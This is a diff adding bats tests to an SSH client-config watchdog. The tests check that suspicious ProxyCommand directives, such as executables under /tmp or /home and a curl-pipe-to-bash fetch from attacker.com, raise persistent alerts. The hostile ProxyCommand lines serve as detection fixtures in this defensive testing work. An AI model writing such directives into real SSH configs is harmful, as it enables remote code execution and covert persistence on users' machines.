@@ -221,3 +221,45 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     main_count=$(cap | grep -cE '^-t selfdef-ssh-client-config -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): ssh-client-config-watchdog does NOT refresh baseline on suspicious-directive detection — alert STAYS until operator updates" {
+    # Per-outbound-ssh root-exec persistence — alert MUST persist
+    # across runs until operator explicitly re-baselines.
+    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
+    run_wd
+    printf 'Host *\n    ProxyCommand /tmp/.x %%h %%p\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"ssh_client_config_exec_directive"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented suspicious ProxyCommand NOT flagged: # prefix filtered)" {
+    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n# ProxyCommand /tmp/.example-attacker %%h %%p\n' > "${CONF}"
+    run_wd
+    ! cap | grep -q '"event":"ssh_client_config_exec_directive"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (ProxyCommand under /home — user-writable hijack coverage)" {
+    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'Host *\n    ProxyCommand /home/user/.x %%h %%p\n' > "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected in ProxyCommand)" {
+    printf 'Host *\n    ProxyCommand /usr/bin/nc %%h %%p\n' > "${CONF}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'Host *\n    ProxyCommand sh -c "curl -s http://attacker.com/p | bash"\n' > "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
